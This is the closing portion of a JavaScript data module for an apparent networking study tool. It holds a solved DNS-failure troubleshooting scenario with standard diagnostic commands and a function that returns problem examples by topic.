      "solution": "The root cause is a DNS (Domain Name System) failure. Because the user can reach the web server using its direct IP address, we know that: 1. Layer 1 Physical link is working. 2. Layer 2 Data Link is working. 3. Layer 3 IP routing and default gateway are working. 4. Layer 4 TCP handshake on port 443 succeeds. 5. Layer 7 web server is alive and responding. The failure occurs exclusively when resolving the hostname 'example.com' to that IP. Diagnostic steps: 1. Check local hosts file (`/etc/hosts` or `C:\\Windows\\System32\\drivers\\etc\\hosts`) for corrupted overrides. 2. Test DNS resolution using `nslookup example.com` or `dig example.com`. If it fails, check the configured DNS server in `ipconfig /all` or `/etc/resolv.conf`. 3. Query a known public DNS server: `nslookup example.com 8.8.8.8`. If the public server succeeds, the user's local ISP or corporate DNS server is down or misconfigured. 4. Flush local DNS cache with `ipconfig /flushdns`.",
      "commonTrap": "Assuming ping failure means the server is completely down."
    }
  ]
};

import { resolveCNTopicId } from './cnTopicDataRegistry.js';

/**
 * Returns solved problem benchmark scenarios for a canonical topicId.
 */
export function getCNProblemExamples(rawTopicId) {
  if (!rawTopicId) return CN_PROBLEM_EXAMPLES['osi-model'] || [];
  const canonicalId = resolveCNTopicId(rawTopicId);
  return CN_PROBLEM_EXAMPLES[canonicalId] || CN_PROBLEM_EXAMPLES['osi-model'] || [];
}
